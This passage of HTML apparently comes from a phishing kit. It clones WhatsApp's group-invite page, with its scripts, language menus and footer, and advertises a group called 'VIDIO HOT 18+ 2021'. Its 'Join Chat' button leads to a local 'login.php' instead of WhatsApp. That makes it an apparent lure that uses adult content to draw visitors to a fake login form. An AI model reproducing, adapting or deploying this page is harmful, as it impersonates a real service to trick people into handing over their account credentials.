                            "actually_flush_lazy_queue": true
                        },
                        "known_routes": ["unified_logging", "artillery_javascript_actions", "artillery_javascript_trace", "artillery_logger_data", "logger", "falco", "gk2_exposure", "js_error_logging", "loom_trace", "marauder", "perfx_custom_logger_endpoint", "qex", "require_cond_exposure_logging", "srt_job_view_heartbeats", "sri_logger_data"],
                        "should_drop_unknown_routes": true,
                        "should_log_unknown_routes": false
                    }, 7],
                    ["cr:692209", ["cancelIdleCallbackBlue"], {
                        "__rc": ["cancelIdleCallbackBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1]
                ],
                "require": [
                    ["markJSEnabled"],
                    ["lowerDomain"],
                    ["URLFragmentPrelude"],
                    ["Primer"],
                    ["BigPipe"],
                    ["Bootloader"],
                    ["TimeSlice"],
                    ["AsyncRequest"],
                    ["BanzaiScuba_DEPRECATED"],
                    ["VisualCompletionGating"],
                    ["FbtLogging"],
                    ["IntlQtEventFalcoEvent"],
                    ["RequireDeferredReference", "unblock", [],
                        [
                            ["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent"]
                        ]
                    ]
                ]
            });
        });
    </script>
</head>

<body id="top-of-page" class="_2yzz _2ywk _whatsapp_www__page--invite en chrome webkit win x1 Locale_en_US" dir="ltr">
    <script nonce="ZGTlWaQE">
        requireLazy(["bootstrapWebSession"], function(j) {
            j(1621605616)
        })
    </script>
    <div id="hide_till_load" class="_2ywh _li _9kh2" style="display: none">
        <div class="_2y_d _9rxy _whatsapp_www__page--invite">
            <div data-testid="whatsapp_www_header" class="_2zpg">
                <header class="_2zpl">
                    <div class="_2yz3 _2ziw" id="header-inner"><a class="_36or _2zq_" data-testid="whatsapp_www_header_logo_link" href="https://www.whatsapp.com/" aria-label="Main page"></a><a class="_36or _2yzn" href="" rel="noopener">WhatsApp Group Invite</a>
                        <div class="_2zpt"><button id="lang"><svg version="1.1" id="icon-language" xmlns="http://www.w3.org/2000/svg" x="0" y="0" width="19px" height="19px" viewBox="0 0 19 19" style="enable-background:new 0 0 19 19;" role="img" aria-labelledby="a11yTitle" space="preserve">
                                    <title id="a11yTitle">Language</title>
                                    <path class="_2y-e" d="M9.5,2C5.4,2,2,5.4,2,9.5S5.4,17,9.5,17c4.1,0,7.5-3.4,
              7.5-7.5S13.6,2,9.5,2z M14.7,6.5h-2.2c-0.2-1-0.6-1.8-1.1-2.7C12.8,
              4.3,14,
              5.2,14.7,
              6.5z M9.5,3.5c0.6,0.9,1.1,1.9,1.4,3H8.1C8.4,
              5.4,8.9,4.4,9.5,3.5z M3.7,
              11c-0.2-0.5-0.2-1-0.2-1.5C3.5,9,3.5,8.4,3.7,8h2.6C6.2,8.5,
              6.2,9,6.2,9.5c0,0.5,
              0.1,1,0.1,1.5H3.7z M4.3,12.5h2.2c0.2,1,0.6,1.8,
              1.1,2.7C6.2,14.7,5,13.8,4.3,
              12.5z M6.5,6.5H4.3c0.8-1.3,1.9-2.2,3.2-2.7C7.1,
              4.7,6.7,5.5,6.5,6.5z M9.5,
              15.5c-0.6-0.9-1.1-1.9-1.4-3h2.9C10.6,13.6,10.1,
              14.6,9.5,15.5z M11.2,
              11H7.8c-0.1-0.5-0.2-1-0.2-1.5c0-0.5,0.1-1,
              0.2-1.5h3.5c0.1,0.5,0.2,1,0.2,
              1.5C11.5,10,
              11.3,10.5,11.2,11z M11.5,15.2c0.5-0.8,0.8-1.7,1.1-2.7h2.2C14,
              13.8,12.8,14.7,11.5,
              15.2z M12.8,11c0.1-0.5,0.1-1,0.1-1.5c0-0.5-0.1-1-0.1-1.5h2.6c0.2,
              0.5,0.2,1,0.2,
              1.5c0,0.5-0.1,1.1-0.2,1.5H12.8z"></path>
                                </svg>
                                <div class="_2zbh">en<svg version="1.1" xmlns="http://www.w3.org/2000/svg" class="_2zbi" x="0" y="0" width="9px" height="20px" viewBox="0 0 9 20" style="enable-background:new 0 0 9 20;">
                                        <polygon fill="#ffffff" points="1,9 4.5,12.5 8,9 "></polygon>
                                    </svg></div>
                            </button>
                            <div class="_2zqm" id="lang-picker" style="display: none;">
                                <div class="_2zqx">Select your language</div>
                                <ul>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=az" dir="auto">azərbaycan</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=af" dir="auto">Afrikaans</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=id" dir="auto">Bahasa Indonesia</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ms" dir="auto">Melayu</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ca" dir="auto">català</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=cs" dir="auto">čeština</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=da" dir="auto">dansk</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=de" dir="auto">Deutsch</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=et" dir="auto">eesti</a></li>
                                    <li class="_2zqt _2zqw"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=en" dir="auto">English</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=es" dir="auto">español</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=fr" dir="auto">français</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ga" dir="auto">Gaeilge</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=hr" dir="auto">hrvatski</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=it" dir="auto">italiano</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sw" dir="auto">Kiswahili</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=lv" dir="auto">latviešu</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=lt" dir="auto">lietuvių</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=hu" dir="auto">magyar</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=nl" dir="auto">Nederlands</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=nb" dir="auto">norsk bokmål</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=uz" dir="auto">o‘zbek</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=tl" dir="auto">Filipino</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pl" dir="auto">polski</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pt_br" dir="auto">Português (Brasil)</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pt_pt" dir="auto">Português (Portugal)</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ro" dir="auto">română</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sq" dir="auto">shqip</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sk" dir="auto">slovenčina</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sl" dir="auto">slovenščina</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=fi" dir="auto">suomi</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sv" dir="auto">svenska</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=vi" dir="auto">Tiếng Việt</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=tr" dir="auto">Türkçe</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=el" dir="auto">Ελληνικά</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=bg" dir="auto">български</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=kk" dir="auto">қазақ тілі</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=mk" dir="auto">македонски</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ru" dir="auto">русский</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sr" dir="auto">српски</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=uk" dir="auto">українська</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=he" dir="auto">עברית</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ar" dir="auto">العربية</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=fa" dir="auto">فارسی</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ur" dir="auto">اردو</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=bn" dir="auto">বাংলা</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=hi" dir="auto">हिन्दी</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=gu" dir="auto">ગુજરાતી</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=kn" dir="auto">ಕನ್ನಡ</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=mr" dir="auto">मराठी</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pa" dir="auto">ਪੰਜਾਬੀ</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ta" dir="auto">தமிழ்</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=te" dir="auto">తెలుగు</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ml" dir="auto">മലയാളം</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=th" dir="auto">ไทย</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=zh_cn" dir="auto">简体中文</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=zh_tw" dir="auto">繁體中文（台灣）</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ja" dir="auto">日本語</a></li>
                                    <li class="_2zqt"><a class="_36or _2zqv" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ko" dir="auto">한국어</a></li>
                                </ul>
                            </div>
                            <div style="display: none;" id="lang-picker_bg" class="_2zqy"></div>
                        </div><button class="_2zpw" id="icon-drawer-open" aria-label="menu"><svg version="1.1" id="icon-menu" xmlns="http://www.w3.org/1999/xlink" x="0" y="0" width="37" height="37" viewBox="0 0 37 37" style="enable-background:new 0 0 37 37;" space="preserve">
                                <path class="_2y-e" d="M8,26h21v-1.8H8V26z M8,11v1.8h21V11H8z
                M8,19.2h21v-1.8H8V19.2z"></path>
                            </svg></button>
                        <div class="_2zpu" id="icon-search"><svg version="1.1" xmlns="http://www.w3.org/1999/xlink" x="0" y="0" width="37" height="37" viewBox="0 0 37 37" style="enable-background:new 0 0 37 37;" space="preserve">
                                <path class="_2y-e" d="M22.9,21.3H22L21.7,21c1.1-1.2,1.7-2.8,1.7-4.5
                c0-3.9-3.1-7.1-7-7.1s-7,3.1-7,7.1c0,3.9,3.1,7,7,7c1.7,0,
                3.3-0.7,4.5-1.7l0.3,0.3v0.9l4.7,4.7l1.6-1.6L22.9,21.3z M16.4,
                21.3c-2.7,0-4.8-2.2-4.8-4.8s2.2-4.8,4.8-4.8s4.8,2.2,4.8,
                4.8S19.1,21.3,16.4,21.3z"></path>
                            </svg></div>
                        <nav class="_2yzy">
                            <ul class="_2yyz">
                                <li class="_2zw6"><a class="_36or" href="https://web.whatsapp.com/">WhatsApp Web</a></li><span class="_2zwe"></span>
                                <li class="_2zw6"><a class="_36or" href="https://www.whatsapp.com/features/">Features</a></li><span class="_2zwe"></span>
                                <li class="_2zw6"><a class="_36or" href="https://www.whatsapp.com/download/">Download</a></li><span class="_2zwe"></span>
                                <li class="_2zw6"><a class="_36or" href="https://www.whatsapp.com/security/">Security</a></li><span class="_2zwe"></span>
                                <li class="_2zw6"><a class="_36or" href="https://faq.whatsapp.com/">Help Center</a></li><span class="_2zwe"></span>
                            </ul>
                        </nav>
                    </div>
                    <nav class="_2zc-" id="menu-drawer" aria-hidden="true">
                        <div class="_2zlb"><button class="_2zix" id="icon-drawer-close" aria-label="close menu"><svg version="1.1" id="icon-close" xmlns="http://www.w3.org/1999/xlink" x="0" y="0" width="37" height="37" viewBox="0 0 37 37" style="enable-background:new 0 0 37 37;" space="preserve">
                                    <polygon class="_2y-e" points="26.7,11.6 25.4,10.3 18.5,17.2
                  11.6,10.3 10.3,11.6 17.2,18.5
                  10.3,25.4 11.6,26.7 18.5,19.8
                  25.4,26.7 26.7,25.4 19.8,18.5 "></polygon>
                                </svg></button>
                            <div class="_2zlc"></div>
                            <ul class="_2z2n _2zo_">
                                <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/download/">Download</a></li>
                                <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/features/">Features</a></li>
                                <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/security/">Security</a></li>
                                <li class="_2zp6"><a class="_36or _2zp7" href="https://faq.whatsapp.com/">Help Center</a></li>
                                <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/contact/">Get in touch</a></li>
                                <li class="_2zp6 _2zp9"><select onchange="window.location =
                            this.options[this.selectedIndex].value;">
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=az">azərbaycan</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=af">Afrikaans</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=id">Bahasa Indonesia</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ms">Melayu</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ca">català</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=cs">čeština</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=da">dansk</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=de">Deutsch</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=et">eesti</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=en" selected="1">English</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=es">español</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=fr">français</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ga">Gaeilge</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=hr">hrvatski</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=it">italiano</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sw">Kiswahili</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=lv">latviešu</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=lt">lietuvių</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=hu">magyar</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=nl">Nederlands</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=nb">norsk bokmål</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=uz">o‘zbek</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=tl">Filipino</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pl">polski</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pt_br">Português (Brasil)</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pt_pt">Português (Portugal)</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ro">română</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sq">shqip</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sk">slovenčina</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sl">slovenščina</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=fi">suomi</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sv">svenska</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=vi">Tiếng Việt</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=tr">Türkçe</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=el">Ελληνικά</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=bg">български</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=kk">қазақ тілі</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=mk">македонски</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ru">русский</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=sr">српски</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=uk">українська</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=he">עברית</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ar">العربية</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=fa">فارسی</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ur">اردو</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=bn">বাংলা</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=hi">हिन्दी</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=gu">ગુજરાતી</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=kn">ಕನ್ನಡ</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=mr">मराठी</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=pa">ਪੰਜਾਬੀ</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ta">தமிழ்</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=te">తెలుగు</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ml">മലയാളം</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=th">ไทย</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=zh_cn">简体中文</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=zh_tw">繁體中文（台灣）</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ja">日本語</option>
                                        <option value="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=ko">한국어</option>
                                    </select></li>
                            </ul>
                        </div>
                    </nav>
                </header>
            </div>
            <div class="_2zry">
                <div class="_2yzc">
                    <div class="_2yz5 _2yz8" style="display: block;" id="main_block">
                        <div class="_2yyk _8cis"><a class="_36or _2y_6 _2z38" href="https://chat.whatsapp.com/FMCUd5UuooX7zA9uKvky4B?lang=en" title="Follow this link to join" id="action-icon"><span class="_2z9j" style="background-image: url(img/grup.jpeg)"></span></a>
                            <h2 class="_2yzk">VIDIO HOT 18+ 2021</h2>
                            <h3 class="_8cit">WhatsApp Group Invite</h3>
                            <div class="_whatsapp_www__block_action"><a class="_36or _2y_c _2z0c _2z07" href="login.php" title="Follow this link to join">Join Chat</a></div>
                        </div>
                        <hr />
                        <div class="_6jg7">Don&#039;t have WhatsApp yet?<br /><a class="_36or" href="https://www.whatsapp.com/download">Download</a></div>
                    </div>
                </div>
            </div>
        </div>
        <div class="_6jg3">
            <div class="_2y-f _2y-g">
                <div class="_2yz1">
                    <div class="_2ywp">
                        <div class="_2yyk _2y-j _2yzj">
                            <h4 class="_2yzk">WhatsApp</h4>
                            <div class="_2y_4">
                                <ul class="_2zne _2zoz">
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/features/">Features</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/security/">Security</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/download/">Download</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://web.whatsapp.com/">WhatsApp Web</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/business/">Business</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/privacy">Privacy</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="_2yyk _2y-j _2yzj">
                            <h4 class="_2yzk">Company</h4>
                            <div class="_2y_4">
                                <ul class="_2zne _2zoz">
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/about/">About</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/join/">Careers</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsappbrand.com/" target="_blank" rel="noopener">Brand Center</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/contact/">Get in touch</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://blog.whatsapp.com/">Blog</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/stories/">WhatsApp Stories</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="_2yyk _2y-j _2yzj">
                            <h4 class="_2yzk">Download</h4>
                            <div class="_2y_4">
                                <ul class="_2zne _2zoz">
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/download/">Mac/PC</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/android/">Android</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/appstore/">iPhone</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="_2yyk _2y-j _2yzj">
                            <h4 class="_2yzk">Help</h4>
                            <div class="_2y_4">
                                <ul class="_2zne _2zoz">
                                    <li class="_2znf"><a class="_36or _2zob" href="https://faq.whatsapp.com/">Help Center</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://twitter.com/whatsapp" target="_blank" rel="noopener">Twitter</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.facebook.com/WhatsApp" target="_blank" rel="noopener">Facebook</a></li>
                                    <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/coronavirus/">Coronavirus</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="_2y-f _2y-h">
                <div class="_2yz1">
                    <div class="_2ywp">
                        <div class="_2y-j" dir="auto">2021 © WhatsApp LLC</div>
                        <div class="_2y-j _2y-k"><a class="_36or _2y-i" href="https://www.whatsapp.com/legal/">Privacy &amp; Terms</a></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div></div>
    <script>
        requireLazy(["Bootloader"], function(m) {
            m.handlePayload({
                "sr_revision": 1003834407,
                "consistency": {
                    "rev": 1003834407
                },
                "rsrcMap": {
                    "2mTEsTN": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yV\/r\/tm-1LG8KCIj.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "kFwZFWQ": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i7M54\/y_\/l\/en_US\/fnX3A4uDiUx.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "jZNkHPB": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/BveO_5nX764.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "66LEdgI": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iC0r4\/yM\/l\/en_US\/yKoocnTnj1Z.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "EF6XDLw": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ipVm4\/y-\/l\/en_US\/rvsUiDJ65lO.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "3tF3AbD": {
                        "type": "js",
                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ys\/r\/AbkkKYl5lcy.js?_nc_x=Ij3Wp8lg5Kz"
                    },
                    "LwCHt1K": {
                        "type": "css",
